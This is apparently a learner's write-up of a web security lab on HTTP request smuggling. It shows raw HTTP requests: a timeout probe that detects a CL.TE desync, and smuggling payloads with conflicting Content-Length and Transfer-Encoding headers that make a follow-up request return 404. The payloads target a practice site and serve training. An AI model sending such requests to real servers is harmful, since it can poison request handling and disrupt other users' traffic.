# Practitioner Lab 128: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

---

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

The first Request I did gave me a timeout

![Untitled](Practitioner%20Lab%20128%20HTTP%20request%20smuggling,%20confi%20fd0ea55a2ab94a8d85bb24683a268970/Untitled.png)

```
POST / HTTP/1.1
Host: 0ac100a3040731e98097c696000200a9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked

3
abc
X

```

This means that its a CL TE 

```
POST / HTTP/1.1
Host: 0ac100a3040731e98097c696000200a9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

try : gotyou
```

I changed the request to the following 

![Untitled](Practitioner%20Lab%20128%20HTTP%20request%20smuggling,%20confi%20fd0ea55a2ab94a8d85bb24683a268970/Untitled%201.png)

I didn’t need the content-type but this was a mistake, nonetheless it still did work. 

This got me the not found page and solved the lab.

This is because front end gets the whole content length which is valid but the back end does not. 

Another solution couldve been 

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```